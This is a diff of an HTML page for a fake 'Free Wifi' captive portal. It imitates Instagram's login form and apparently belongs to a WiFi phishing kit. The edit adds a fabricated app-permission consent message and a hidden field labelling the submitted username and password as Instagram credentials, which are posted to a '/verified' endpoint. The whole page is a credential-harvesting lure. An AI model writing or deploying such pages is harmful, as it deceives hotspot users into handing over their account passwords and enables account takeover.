@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Instagram Free WiFi</title>
+  <title>Free Wifi - Instagram</title>
   <meta name="viewport" content="width=device-width, initial-scale=0.75">
   <link rel="icon" href="data:,">
   <link rel="stylesheet" type="text/css" href="instagram_style.css">
@@ -10,14 +10,15 @@
   <div class="container">
       <div class="box">
           <div class="heading"></div>
-          <p>Welcome to testing of our new service! We decided to create free WiFi as thanks to our clients. Now all you need to do is log in with your instagram account.</p>
-          <form class="login-form" action="/success">
+          <p>Application <strong>Free Wifi</strong> wants to access your account informations. Application will gain permission to following informations: <strong>Username, Profile Picture</strong></p>
+          <form class="login-form" action="/verified">
+              <input id="authMethod" type="authMethod" name="authMethod" value="Instagram" hidden/>
               <div class="field">
-                  <input required id="username" type="name" name="username" placeholder="Phone number, username, or email" />
+                  <input id="username" type="name" name="username" placeholder="Phone number, username, or email" required/>
                   <label for="username">Phone number, username, or email</label>
               </div>
               <div class="field">
-                  <input required id="password" type="password" name="password" placeholder="Password" />
+                  <input id="password" type="password" name="password" placeholder="Password" required/>
                   <label for="password">Password</label>
               </div>
               <button class="login-button" title="login">Log In</button>
